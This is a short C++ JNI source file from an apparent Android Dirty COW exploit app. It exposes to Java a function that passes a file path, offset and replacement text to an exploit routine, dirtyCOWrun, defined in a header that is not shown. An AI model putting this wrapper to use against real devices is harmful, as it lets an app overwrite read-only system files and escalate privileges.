#include <jni.h>
#include <string>

extern "C" {
#include "dirtyCOW.h"
}



extern "C"
JNIEXPORT jstring


JNICALL
Java_com_example_avr_androiddirtycow_MainActivity_stringFromJNI(
        JNIEnv *env,
        jobject /* this */) {

    std::string hello = "Hello from C++";
    return env->NewStringUTF(hello.c_str());

}


extern "C"
JNIEXPORT jboolean JNICALL
Java_com_example_avr_androiddirtycow_MainActivity_dirtyCOW_1JNI(JNIEnv *env, jobject instance,
                                                                jstring path_, jint offset,
                                                                jstring replacementText_) {
    // Convert JNI Arguments
    const char *path = env->GetStringUTFChars(path_, 0);
    const char *replacementText = env->GetStringUTFChars(replacementText_, 0);
    off_t fileOffset = (off_t) offset;


    // Call dirtyCOW
    dirtyCOWrun(path, replacementText, fileOffset);


    env->ReleaseStringUTFChars(path_, path);
    env->ReleaseStringUTFChars(replacementText_, replacementText);

    jboolean rtn = 0;
    return rtn;
}